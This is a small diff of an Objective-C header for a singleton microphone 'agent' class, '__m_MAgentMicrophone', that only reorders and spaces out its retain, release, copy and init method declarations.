@@ -75,12 +75,14 @@ void myInputAudioCallback(void                               *inUserData,
 @property (readwrite, assign) NSMutableData *mAudioBuffer;
 
 + (__m_MAgentMicrophone *)sharedInstance;
+
 + (id)allocWithZone: (NSZone *)aZone;
-- (id)copyWithZone: (NSZone *)aZone;
-- (id)retain;
+
 - (unsigned)retainCount;
-- (void)release;
+- (id)retain;
 - (id)autorelease;
+- (void)release;
+- (id)copyWithZone: (NSZone *)aZone;
 - (id)init;
 
 - (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
